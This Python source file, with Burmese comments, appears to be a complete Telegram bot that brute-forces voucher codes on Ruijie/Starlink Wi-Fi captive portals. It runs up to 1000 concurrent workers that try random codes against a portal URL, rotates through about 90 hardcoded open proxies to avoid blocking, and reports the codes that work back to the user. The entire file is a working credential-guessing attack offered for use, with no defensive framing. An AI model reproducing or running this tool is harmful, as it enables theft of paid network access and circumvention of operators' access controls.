import os
import logging
import asyncio
import aiohttp
import random
import string
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, CallbackQueryHandler, MessageHandler, filters

# Logging setup
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# ပေးပို့လာသော Proxy စာရင်းများကို တိုက်ရိုက် သတ်မှတ်ပေးခြင်း
def load_proxies_from_file():
    proxies = [
        "http://103.77.173.125:9486",
        "http://160.19.16.101:8181",
        "http://172.210.12.8:3128",
        "http://41.33.245.139:1976",
        "http://41.128.77.76:1981",
        "http://41.128.77.76:1976",
        "http://178.92.72.154:8080",
        "http://154.201.126.44:8080",
        "http://178.92.72.149:8080",
        "http://178.92.72.54:8080",
        "http://178.92.72.134:8080",
        "http://45.194.3.132:8080",
        "http://172.236.242.244:3128",
        "http://150.241.245.249:8080",
        "http://15.235.145.229:1081",
        "http://8.219.97.248:80",
        "http://102.208.228.90:3128",
        "http://184.75.221.82:3118",
        "http://68.183.22.37:10000",
        "http://43.98.172.166:3128",
        "http://27.185.218.213:17981",
        "http://45.194.90.194:8080",
        "http://178.92.72.194:8080",
        "http://120.232.115.57:17981",
        "http://45.195.105.20:8080",
        "http://202.154.19.50:3125",
        "http://116.101.13.84:10001",
        "http://156.240.114.210:3129",
        "http://150.241.245.131:8080",
        "http://123.253.145.165:8080",
        "http://103.168.44.83:8081",
        "http://34.43.46.91:80",
        "http://43.165.191.196:1082",
        "http://178.92.72.94:8080",
        "http://116.196.150.180:17981",
        "http://154.201.127.230:8080",
        "http://178.92.72.162:8080",
        "http://178.92.72.129:8080",
        "http://4.194.233.145:3128",
        "http://34.43.46.91:443",
        "http://45.194.41.70:8080",
        "http://45.194.41.141:8080",
        "http://154.201.126.245:8080",
        "http://43.156.227.68:80",
        "http://43.155.62.157:443",
        "http://111.196.31.120:8888",
        "http://34.131.37.209:40001",
        "http://13.59.172.95:3128",
        "http://111.192.49.90:8888",
        "http://113.45.195.147:3128",
        "http://102.208.228.90:8080",
        "http://111.192.40.90:8888",
        "http://159.89.87.80:10000",
        "http://160.19.18.243:8080",
        "http://103.35.156.208:8080",
        "http://2.28.105.45:8888",
        "http://110.44.115.83:8080",
        "http://103.193.144.81:8080",
        "http://45.194.41.16:8080",
        "http://178.92.72.165:8080",
        "http://178.92.72.73:8080",
        "http://45.194.3.119:8080",
        "http://124.105.79.237:8080",
        "http://45.43.60.220:8080",
        "http://38.51.207.104:8080",
        "http://119.28.233.241:3128",
        "http://178.92.72.68:8080",
        "http://34.101.229.7:80",
        "http://103.180.119.182:8082",
        "http://45.194.41.155:8080",
        "http://149.71.241.164:8080",
        "http://45.194.41.103:8080",
        "http://165.225.113.220:11589",
        "http://38.47.176.92:80",
        "http://68.183.224.109:3128",
        "http://103.82.92.104:2406",
        "http://41.128.90.53:1981",
        "http://180.149.44.182:3128",
        "http://14.242.19.156:2001",
        "http://36.50.56.237:8080",
        "http://103.183.8.135:8080",
        "http://61.245.9.172:5050",
        "http://103.183.8.139:8080",
        "http://192.232.48.18:8181",
        "http://45.194.90.225:8080",
        "http://103.146.38.53:1080",
        "http://102.203.101.77:8080",
        "http://220.128.223.136:8081",
        "http://43.156.248.220:80",
        "http://103.247.14.138:7778",
        "http://160.22.207.95:8082"
    ]
    print(f"[ProxyManager] Loaded {len(proxies)} hardcoded proxies successfully.")
    return proxies

# Tracking states
scanning_states = {}
user_modes = {}
user_workers = {}
user_portals = {}
user_proxies = {}
found_codes = {}

def show_startup_banner():
    print("=" * 65)
    print("  ⚡  RUIJIE ASYNC EXTREME SCANNER  ⚡")
    print("=" * 65)
    print("Checking authorization...")
    print("[+] Access Granted!")
    print("[*] Status: Online & Ready")
    print("=" * 65)
    print("[ProxyManager] Proxy Manager initialized successfully")
    print("Bot is running with python-telegram-bot...")
    print("=" * 65)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id not in user_modes:
        user_modes[chat_id] = "Number 6"
    if chat_id not in user_workers:
        user_workers[chat_id] = 1000
    
    if chat_id not in user_proxies or not user_proxies[chat_id]:
        user_proxies[chat_id] = load_proxies_from_file()
    
    proxy_count = len(user_proxies.get(chat_id, []))
    
    keyboard = [
        [InlineKeyboardButton("🌐 Update Portal URL", callback_data="update_portal")],
        [InlineKeyboardButton("⚙ Mode", callback_data="change_mode")],
        [InlineKeyboardButton(f"🔧 Workers: {user_workers[chat_id]}", callback_data="change_workers")],
        [InlineKeyboardButton("🔄 Change Proxy", callback_data="add_proxies")],
        [InlineKeyboardButton("🚀 Start Scanner", callback_data="start_scanner")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    text = (
        "⚡ **Starlink & Ruijie Scanner Control Panel** ⚡\n\n"
        f"⚙️ Current Mode: `{user_modes[chat_id]}`\n"
        f"🔧 Workers: `{user_workers[chat_id]}`\n"
        f"🔗 Proxies: `{proxy_count}`"
    )
    
    if update.message:
        await update.message.reply_text(text, reply_markup=reply_markup, parse_mode="Markdown")
    elif update.callback_query:
        await update.callback_query.message.edit_text(text, reply_markup=reply_markup, parse_mode="Markdown")

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    chat_id = query.message.chat_id
    
    data = query.data
    if data == "update_portal":
        context.user_data['waiting_for'] = 'portal'
        await query.message.reply_text("🔗 Portal URL ကို ပို့ပေးပါ:")
    
    elif data == "change_mode":
        keyboard = [
            [InlineKeyboardButton("Number 6", callback_data="mode_Number 6"), InlineKeyboardButton("Number 7", callback_data="mode_Number 7"), InlineKeyboardButton("Number 8", callback_data="mode_Number 8")],
            [InlineKeyboardButton("Number 9", callback_data="mode_Number 9")],
            [InlineKeyboardButton("Abc 6", callback_data="mode_Abc 6"), InlineKeyboardButton("Mix 6", callback_data="mode_Mix 6"), InlineKeyboardButton("Mix 7", callback_data="mode_Mix 7")],
            [InlineKeyboardButton("Mix 8", callback_data="mode_Mix 8"), InlineKeyboardButton("Mix 9", callback_data="mode_Mix 9")],
            [InlineKeyboardButton("Custom Start", callback_data="mode_Custom Start")],
            [InlineKeyboardButton("🔙 Back", callback_data="mode_back")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.message.edit_text("⚙️ **Choose Scanner Mode**", reply_markup=reply_markup, parse_mode="Markdown")
    
    elif data.startswith("mode_"):
        selected_mode = data.replace("mode_", "")
        if selected_mode == "back":
            await start(update, context)
        else:
            user_modes[chat_id] = selected_mode
            await start(update, context)
            
    elif data == "change_workers":
        keyboard = [
            [InlineKeyboardButton("300", callback_data="worker_300"), InlineKeyboardButton("500", callback_data="worker_500")],
            [InlineKeyboardButton("800", callback_data="worker_800"), InlineKeyboardButton("1000", callback_data="worker_1000")],
            [InlineKeyboardButton("🔙 Back", callback_data="worker_back")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.message.edit_text("⚙️ **Choose Worker Count (300 - 1000)**", reply_markup=reply_markup, parse_mode="Markdown")
        
    elif data.startswith("worker_"):
        selected = data.replace("worker_", "")
        if selected == "back":
            await start(update, context)
        else:
            user_workers[chat_id] = int(selected)
            await start(update, context)

    elif data == "add_proxies":
        context.user_data['waiting_for'] = 'proxy'
        await query.message.reply_text("➕ Proxy စာသားများကို (တစ်ကြောင်းချင်း သို့မဟုတ် စာရင်းလိုက်) ပို့ပေးပါ။")
    
    elif data == "start_scanner":
        portal = user_portals.get(chat_id)
        if not portal:
            await query.message.reply_text("⚠️ ပထမဦးစွာ Portal URL ကို အရင် Update လုပ်ပါ။")
            return
        if scanning_states.get(chat_id, False):
            await query.message.reply_text("⚠️ စကင်န်ဖတ်ခြင်း လုပ်ငန်းစဉ် လုပ်ဆောင်ဆဲ ဖြစ်ပါသည်။")
            return
        asyncio.create_task(run_scanner_with_workers(query, context, portal))

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    text = update.message.text.strip()
    waiting_for = context.user_data.get('waiting_for')
    
    if waiting_for == 'portal':
        user_portals[chat_id] = text
        context.user_data['waiting_for'] = None
        await update.message.reply_text("✅ Portal URL အောင်မြင်စွာ သိမ်းဆည်းပြီးပါပြီ။")
        await start(update, context)
    elif waiting_for == 'proxy':
        proxies = user_proxies.get(chat_id, [])
        new_proxies = [p.strip() for p in text.split('\n') if p.strip()]
        proxies.extend(new_proxies)
        user_proxies[chat_id] = proxies
        context.user_data['waiting_for'] = None
        await update.message.reply_text(f"✅ Proxy များ ထည့်သွင်းပြီးပါပြီ။ (စုစုပေါင်း: {len(proxies)})")
        await start(update, context)
    else:
        await update.message.reply_text("ℹ️ ကျေးဇူးပြု၍ မီနူးခလုတ်များကို အသုံးပြုပါ။")

def generate_code_by_mode(mode):
    length = 6
    for char in mode:
        if char.isdigit():
            length = int(char)
            break
            
    if "Number" in mode:
        return "".join(random.choices(string.digits, k=length))
    elif "Mix" in mode:
        chars = string.ascii_lowercase + string.digits
        return "".join(random.choices(chars, k=length))
    elif "Abc" in mode:
        return "".join(random.choices(string.ascii_lowercase, k=length))
    else:
        chars = string.ascii_lowercase + string.digits
        return "".join(random.choices(chars, k=length))

async def worker_task(worker_id, session, portal_url, chat_id):
    while scanning_states.get(chat_id, False):
        mode = user_modes.get(chat_id, "Number 6")
        code_val = generate_code_by_mode(mode)
        
        if not hasattr(worker_task, "current_codes"):
            worker_task.current_codes = {}
        worker_task.current_codes[chat_id] = code_val
        
        proxies_list = user_proxies.get(chat_id, [])
        proxy = random.choice(proxies_list) if proxies_list else None
        if proxy and not proxy.startswith("http"):
            proxy = f"http://{proxy}"
            
        try:
            target_url = f"{portal_url}&code={code_val}" if "?" in portal_url else f"{portal_url}?code={code_val}"
            async with session.get(target_url, proxy=proxy, timeout=2) as response:
                html_content = await response.text()
                if response.status == 200 and any(kw in html_content.lower() for kw in ["success", "welcome", "connected", "auth_pass", "login successfully"]):
                    if chat_id not in found_codes:
                        found_codes[chat_id] = []
                    if code_val not in found_codes[chat_id]:
                        found_codes[chat_id].append(code_val)
        except Exception:
            pass
        await asyncio.sleep(0.02)

async def run_scanner_with_workers(query, context, portal_url):
    chat_id = query.message.chat_id
    scanning_states[chat_id] = True
    found_codes[chat_id] = []
    
    workers_count = user_workers.get(chat_id, 1000)
    mode = user_modes.get(chat_id, "Number 6")
    
    status_message = await query.message.reply_text(
        f"⚡ **Ruijie Voucher Scanner စတင်နေပါပြီ ({mode} | Workers: {workers_count})...**\nရပ်တန့်ရန် `/stop` ဟု ရိုက်ပါ။", 
        parse_mode="Markdown"
    )
    
    connector = aiohttp.TCPConnector(limit=workers_count, limit_per_host=workers_count)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [
            asyncio.create_task(worker_task(i, session, portal_url, chat_id)) 
            for i in range(workers_count)
        ]
        
        tried = 0
        while scanning_states.get(chat_id, False):
            tried += workers_count * 15
            hits_list = found_codes.get(chat_id, [])
            hits_str = ", ".join(hits_list[-5:]) if hits_list else "None"
            
            current_codes_dict = getattr(worker_task, "current_codes", {})
            current_code = current_codes_dict.get(chat_id, generate_code_by_mode(mode))
            
            live_text = (
                f"⚡ **Ruijie Scanner Running ({mode})** ⚡\n"
                f"🔗 Portal: Connected\n\n"
                f"🏹 Tried: ~{tried}\n"
                f"🎯 Current Code: `{current_code}`\n"
                f"🔥 Hits Found: {len(hits_list)}\n"
                f"🔑 Latest Hits: `{hits_str}`\n"
                f"⚙️ Mode: {mode}\n"
                f"🔧 Active Workers: {workers_count}\n\n"
                "🛑 ရပ်တန့်ရန် `/stop` ဟု ရိုက်ပါ။"
            )
            try:
                await status_message.edit_text(live_text, parse_mode="Markdown")
            except Exception:
                pass
            
            await asyncio.sleep(2)
            
        for task in tasks:
            task.cancel()

    final_hits = found_codes.get(chat_id, [])
    final_text = "🛑 စကင်န်ဖတ်ခြင်း ရပ်တန့်သွားပါပြီ။\n\n"
    if final_hits:
        final_text += f"🎉 **တွေ့ရှိခဲ့သော Ruijie Voucher Codes များ:**\n`" + "\n".join(final_hits) + "`"
    else:
        final_text += "ℹ️ တွေ့ရှိသော Code အသစ် မရှိသေးပါ။"
        
    await query.message.reply_text(final_text, parse_mode="Markdown")

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if scanning_states.get(chat_id, False):
        scanning_states[chat_id] = False
        await update.message.reply_text("🛑 စကင်န်ဖတ်ခြင်းကို ရပ်တန့်နေပါပြီ...")
    else:
        await update.message.reply_text("ℹ️ လက်ရှိ အလုပ်လုပ်နေသော စကင်န် မရှိပါ။")

def main():
    show_startup_banner()
    
    token = os.environ.get("BOT_TOKEN")
    if not token:
        print("Error: BOT_TOKEN ကို Replit Secrets ထဲတွင် ထည့်သွင်းပေးပါ။")
        return

    application = ApplicationBuilder().token(token).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("stop", stop_command))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_message))

    print("🤖 Bot အသင့်ဖြစ်ပါပြီ...")
    application.run_polling()

if __name__ == '__main__':
    main()
        
